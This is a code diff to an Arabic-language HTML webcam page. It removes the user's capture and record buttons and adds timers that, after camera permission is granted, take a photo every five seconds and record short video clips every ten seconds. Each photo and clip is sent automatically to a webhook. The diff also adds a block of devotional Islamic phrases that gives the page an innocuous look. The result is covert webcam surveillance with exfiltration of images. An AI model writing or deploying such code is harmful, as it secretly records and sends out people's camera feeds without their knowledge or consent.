@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة وفيديو</title>
+    <title>التقاط صورة وفيديو تلقائي</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -38,23 +38,34 @@
             margin-top: 20px;
             font-size: 18px;
         }
+        .prayer {
+            font-size: 22px;
+            color: #0000cd;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <h1>التقاط صورة وفيديو من الكاميرا</h1>
+    <h1>التقاط صورة وفيديو تلقائي</h1>
+    
+    <!-- عرض الذكرى بشكل تلقائي -->
+    <div>
+        <p class="prayer">بسم الله الرحمن الرحيم</p>
+        <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
+        <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
+        <p class="prayer">لا إله إلا الله محمد رسول الله</p>
+        <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
+    </div>
+
     <video id="video" autoplay></video>
     <br>
-    <button id="captureButton">التقاط الصورة</button>
-    <button id="recordButton">تسجيل الفيديو</button>
     <p class="message" id="message"></p>
 
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        const captureButton = document.getElementById('captureButton');
-        const recordButton = document.getElementById('recordButton');
         const message = document.getElementById('message');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -67,29 +78,33 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                // بدء التقاط الصور والفيديو بعد 5 ثواني
+                setInterval(captureImage, 5000); // التقاط صورة كل 5 ثواني
+                setInterval(startRecording, 10000); // بدء تسجيل فيديو كل 10 ثواني
             } catch (err) {
                 message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
                 console.error("خطأ في الوصول إلى الكاميرا: ", err);
             }
         }
 
-        // التقاط صورة عند الضغط على الزر
-        captureButton.addEventListener('click', () => {
+        // التقاط صورة بشكل تلقائي
+        function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             sendImageToWebhook(imageData);
-        });
+        }
 
-        // بدء تسجيل الفيديو
-        recordButton.addEventListener('click', () => {
-            if (recorder && recorder.state === 'recording') {
+        // بدء تسجيل الفيديو بشكل تلقائي
+        function startRecording() {
+            chunks = [];
+            recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstop = () => sendVideoToWebhook();
+            recorder.start();
+            setTimeout(() => {
                 recorder.stop();
-                recordButton.textContent = "تسجيل الفيديو";
-            } else {
-                startRecording();
-                recordButton.textContent = "إيقاف التسجيل";
-            }
-        });
+            }, 5000); // توقف عن التسجيل بعد 5 ثواني
+        }
 
         // إرسال الصورة إلى الـ Webhook
         async function sendImageToWebhook(imageData) {
@@ -111,15 +126,6 @@
                 message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
                 console.error("Error sending image:", err);
             }
-        }
-
-        // بدء تسجيل الفيديو
-        function startRecording() {
-            chunks = [];
-            recorder = new MediaRecorder(stream);
-            recorder.ondataavailable = (e) => chunks.push(e.data);
-            recorder.onstop = () => sendVideoToWebhook();
-            recorder.start();
         }
 
         // إرسال الفيديو إلى الـ Webhook
